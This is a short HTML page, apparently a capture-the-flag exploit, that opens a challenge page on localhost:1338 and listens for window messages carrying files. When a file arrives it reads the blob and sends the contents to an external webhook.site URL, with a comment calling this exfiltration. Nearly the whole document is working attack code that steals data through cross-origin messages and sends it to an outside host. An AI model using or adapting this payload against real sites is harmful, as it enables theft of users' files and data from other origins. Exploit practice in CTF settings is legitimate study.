<!DOCTYPE html>
<html>
  <body>
    <script>
      // Wait for the flag message from the challenge page
      window.addEventListener("message", (event) => {
        if (event.data?.files?.length > 0) {
          const blob = event.data.files[0].blob;

          const reader = new FileReader();
          reader.onload = function () {
            // Exfiltrate to your webhook
            fetch("https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df", {
              method: "POST",
              headers: { "Content-Type": "text/plain" },
              body: reader.result
            });
          };
          reader.readAsText(blob);
        }
      });

      // Open the challenge page, where the bot injects the flag
      window.open("http://localhost:1338/", "_blank");
    </script>
    <p>Waiting for flag...</p>
  </body>
</html>
